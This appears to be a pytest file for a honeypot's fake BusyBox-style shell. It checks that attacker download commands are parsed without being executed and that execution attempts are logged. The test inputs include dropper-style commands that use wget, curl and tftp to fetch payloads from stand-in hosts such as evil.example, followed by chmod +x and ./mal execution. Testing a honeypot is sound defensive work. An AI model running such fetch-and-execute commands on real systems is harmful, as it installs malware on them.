"""Tests for the fake shell dispatcher (honeypot/shell/commands.py).

Focus: download commands are *parsed*, never executed; execution-attempt
commands are acknowledged without ever mutating the fake filesystem's
permission model (it has none) or touching the real filesystem.
"""
from __future__ import annotations

from honeypot.config.schema import PersonaConfig
from honeypot.shell.commands import dispatch
from honeypot.shell.filesystem import FakeFilesystem


def _fs() -> FakeFilesystem:
    return FakeFilesystem(PersonaConfig(arch="riscv64"))


def test_wget_is_parsed_not_executed():
    result = dispatch("wget http://1.2.3.4/mal.riscv64 -O mal", _fs(), PersonaConfig(arch="riscv64"))
    assert result.download_request is not None
    assert result.download_request.protocol == "http"
    assert result.download_request.url == "http://1.2.3.4/mal.riscv64"
    assert result.download_request.requested_filename == "mal"


def test_wget_without_explicit_output_uses_url_basename():
    result = dispatch("wget http://evil.example/payload.bin", _fs(), PersonaConfig(arch="riscv64"))
    assert result.download_request.requested_filename == "payload.bin"


def test_busybox_wget_prefix_is_unwrapped():
    result = dispatch("busybox wget http://evil.example/x.bin", _fs(), PersonaConfig(arch="riscv64"))
    assert result.download_request is not None
    assert result.download_request.url == "http://evil.example/x.bin"


def test_curl_is_parsed():
    result = dispatch("curl -o out.bin http://evil.example/x", _fs(), PersonaConfig(arch="riscv64"))
    assert result.download_request.requested_filename == "out.bin"


def test_tftp_get_is_parsed():
    result = dispatch("tftp -g -r payload.bin 10.0.0.1", _fs(), PersonaConfig(arch="riscv64"))
    assert result.download_request is not None
    assert result.download_request.protocol == "tftp"
    assert result.download_request.requested_filename == "payload.bin"


def test_chmod_plus_x_is_acknowledged_but_logged_as_execution_attempt():
    result = dispatch("chmod +x mal", _fs(), PersonaConfig(arch="riscv64"))
    assert result.output == ""
    assert result.execution_attempt is not None
    assert "chmod" in result.execution_attempt


def test_dotslash_execution_is_acknowledged_and_logged():
    result = dispatch("./mal", _fs(), PersonaConfig(arch="riscv64"))
    assert result.output == ""
    assert result.execution_attempt == "./mal"


def test_sh_execution_is_logged():
    result = dispatch("sh mal", _fs(), PersonaConfig(arch="riscv64"))
    assert result.execution_attempt == "sh mal"


def test_unknown_command_returns_busybox_style_error():
    result = dispatch("frobnicate --now", _fs(), PersonaConfig(arch="riscv64"))
    assert result.output == "-ash: frobnicate: not found"


def test_uname_a_reflects_persona():
    fs = _fs()
    persona = PersonaConfig(arch="riscv64")
    result = dispatch("uname -a", fs, persona)
    assert "riscv64" in result.output
    assert persona.hostname in result.output


def test_cd_ls_pwd_roundtrip():
    fs = _fs()
    persona = PersonaConfig(arch="riscv64")
    assert dispatch("cd /etc", fs, persona).output == ""
    assert dispatch("pwd", fs, persona).output == "/etc"
    listing = dispatch("ls", fs, persona).output
    assert "os-release" in listing


def test_cat_missing_file_reports_error_without_raising():
    fs = _fs()
    persona = PersonaConfig(arch="riscv64")
    result = dispatch("cat /nope", fs, persona)
    assert "No such file" in result.output


def test_mkdir_touch_rm_echo_roundtrip():
    fs = _fs()
    persona = PersonaConfig(arch="riscv64")
    dispatch("mkdir /tmp/x", fs, persona)
    assert fs.is_dir("/tmp/x")
    dispatch("touch /tmp/x/f", fs, persona)
    assert fs.exists("/tmp/x/f")
    dispatch("echo hi > /tmp/x/f", fs, persona)
    assert fs.read_file("/tmp/x/f") == "hi\n"
    dispatch("rm /tmp/x/f", fs, persona)
    assert not fs.exists("/tmp/x/f")


def test_exit_sets_exit_session_flag():
    result = dispatch("exit", _fs(), PersonaConfig(arch="riscv64"))
    assert result.exit_session is True
